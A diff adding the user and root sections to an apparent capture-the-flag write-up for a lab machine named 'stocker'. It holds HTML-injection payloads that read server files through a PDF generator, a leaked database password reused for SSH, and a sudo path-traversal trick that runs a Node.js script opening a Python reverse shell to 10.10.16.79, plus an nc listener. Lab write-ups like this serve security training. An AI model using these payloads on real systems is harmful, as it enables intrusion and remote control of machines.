@@ -116,4 +116,37 @@ So, if the PDF creator bot finds some kind of HTML tags, it is going to interpre
 We can try to inject some payloads into the `title` field to see if the website is vulnerable.
 If we inject this payload `<iframe src=file:///etc/passwd></iframe>` we can see in the returned pdf file the contents of the `/etc/passwd` file and find out the name of the user `angoose`.
 Note that if the frame is too small to read the entire file, you can add some in-line css styling to make the frame bigger.
+
+## User
 If can find the path of the project by injecting the following payload `<script> document.write(window.location) </script>` which returns `file:///var/www/dev/pos/64233e83a8e0cb4c2d3cfb83.html` we can now try to find the main file in the project subdirectories.
+With a few tries we can find the file `/var/www/dev/index.js` which contains the source code of the webserver.
+We can also see the connection string to the MongoDB database:
+```js
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+```
+Which logs the user `dev` with the password `IHeardPassphrasesArePrettySecure`.
+If we try to login the user `angoose` with SSH and use the password we found to connect to MongoDB we can get in the server.
+We can then find the user flag inside the `/home/angoose/user.txt` file.
+
+## Root
+First thing we can check what the user can do by running `sudo -l` passing the password we found erlier and get the following output:
+```
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+```
+We can see that we can run `node` as sudo on all js scripts inside the `/usr/local/scripts/` directory.
+We can exploit this to make it run our own js script, the user doesn't have permission to write into the `/usr/local/scripts/` directory, but we can exploit the path expression.
+Firstly we can write a js script inside the `/home/angoose/` directory to execute a privileged python reverse shell:
+```js
+var exec = require('child_process').exec;
+exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.79\",4999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'", () => {console.log("Executed")});
+```
+we then listen to connections on the port `4999` on our local machine:
+```
+nc -lvnp 4999
+```
+and execute the script by running `sudo /usr/bin/node /usr/local/scripts/../../home/angoose/exploit.js`.
+Once we instantiated a shell and we can get the root flag inside the `/root/root.txt` file.
